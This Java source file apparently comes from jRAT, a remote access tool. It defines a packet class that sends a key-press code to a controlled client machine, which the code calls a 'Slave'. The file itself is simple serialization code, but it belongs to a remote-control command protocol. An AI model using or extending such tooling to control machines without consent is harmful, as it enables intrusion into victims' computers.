package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet94KeyPress extends AbstractOutgoingPacket {

	private int keyCode;

	public Packet94KeyPress(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(keyCode);
	}

	@Override
	public byte getPacketId() {
		return 94;
	}

}
